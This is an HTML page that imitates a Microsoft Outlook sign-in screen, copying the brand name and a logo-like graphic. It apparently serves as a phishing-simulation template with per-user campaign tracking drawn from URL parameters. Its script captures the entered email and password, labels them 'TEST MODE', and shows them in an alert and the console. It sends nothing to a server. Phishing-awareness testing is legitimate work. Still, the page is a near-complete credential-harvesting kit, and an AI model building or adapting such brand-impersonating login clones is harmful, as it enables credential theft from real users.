<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a73e8 0%, #0d47a1 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
            padding: 44px;
            width: 440px;
            max-width: 90%;
        }
        .logo {
            text-align: center;
            margin-bottom: 24px;
        }
        .logo svg {
            width: 100px;
            height: 40px;
        }
        h1 {
            font-size: 20px;
            font-weight: 600;
            color: #1b1b1b;
            text-align: center;
            margin-bottom: 8px;
        }
        .subtitle {
            font-size: 13px;
            color: #5f6368;
            text-align: center;
            margin-bottom: 32px;
        }
        .input-group {
            margin-bottom: 20px;
            position: relative;
        }
        .input-group input {
            width: 100%;
            padding: 16px 12px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s;
        }
        .input-group input:focus {
            border-color: #1a73e8;
            border-width: 2px;
            padding: 15px 11px;
        }
        .input-group label {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: white;
            padding: 0 4px;
            color: #5f6368;
            font-size: 16px;
            transition: all 0.2s;
            pointer-events: none;
        }
        .input-group input:focus + label,
        .input-group input:not(:placeholder-shown) + label {
            top: 0;
            font-size: 12px;
            color: #1a73e8;
        }
        .forgot {
            text-align: left;
            margin-bottom: 24px;
        }
        .forgot a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .btn {
            width: 100%;
            padding: 12px;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn:hover {
            background: #1557b0;
        }
        .footer {
            margin-top: 24px;
            text-align: center;
            font-size: 12px;
            color: #5f6368;
        }
        .footer a {
            color: #1a73e8;
            text-decoration: none;
        }
        .tracking { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 100 40" xmlns="http://www.w3.org/2000/svg">
                <path d="M9.5 18.5L18 9l8.5 9.5L18 28z" fill="#4285F4"/>
                <path d="M2 20h15v5H2z" fill="#34A853"/>
                <path d="M28 22.5L19.5 32 11 22.5 19.5 13z" fill="#FBBC04"/>
                <path d="M19.5 0l9.5 10-9.5 10L10 10z" fill="#EA4335"/>
                <text x="35" y="28" font-family="Segoe UI, sans-serif" font-size="20" font-weight="600" fill="#333">Microsoft</text>
            </svg>
        </div>
        <h1>Sign in</h1>
        <p class="subtitle">to continue to Outlook</p>
        <form id="loginForm" action="#" method="POST">
            <div class="input-group">
                <input type="email" id="email" name="email" placeholder=" " required autocomplete="off">
                <label for="email">Email or phone</label>
            </div>
            <div class="input-group" id="passwordGroup" style="display:none;">
                <input type="password" id="password" name="password" placeholder=" " required>
                <label for="password">Password</label>
            </div>
            <div class="forgot" id="forgotLink" style="display:none;">
                <a href="#">Forgot password?</a>
            </div>
            <button type="submit" class="btn" id="nextBtn">Next</button>
        </form>
        <div class="footer">
            <p>Don't have an account? <a href="#">Sign up</a></p>
            <p style="margin-top:12px;">© 2026 Microsoft Corporation</p>
        </div>
    </div>
    <div class="tracking" id="tracking"></div>
    <script>
        const params = new URLSearchParams(window.location.search);
        const campaignId = params.get('campaign') || 'unknown';
        const variant = params.get('variant') || 'unknown';
        const userId = params.get('user') || 'unknown';
        console.log('Campaign:', campaignId, 'Variant:', variant, 'User:', userId);
        
        const emailInput = document.getElementById('email');
        const passwordGroup = document.getElementById('passwordGroup');
        const forgotLink = document.getElementById('forgotLink');
        const nextBtn = document.getElementById('nextBtn');
        let step = 1;
        
        nextBtn.addEventListener('click', function(e) {
            e.preventDefault();
            if (step === 1) {
                if (emailInput.value && emailInput.value.includes('@')) {
                    step = 2;
                    passwordGroup.style.display = 'block';
                    forgotLink.style.display = 'block';
                    document.querySelector('.subtitle').textContent = 'Enter password';
                    nextBtn.textContent = 'Sign in';
                    document.getElementById('password').focus();
                }
            } else {
                const email = emailInput.value;
                const password = document.getElementById('password').value;
                alert('TEST MODE: Credentials captured for analysis\n\nEmail: ' + email + '\nPassword: ' + password + '\n\nCampaign: ' + campaignId + '\nVariant: ' + variant);
                console.log('Captured credentials:', { email, password, campaignId, variant, userId });
            }
        });
    </script>
</body>
</html>
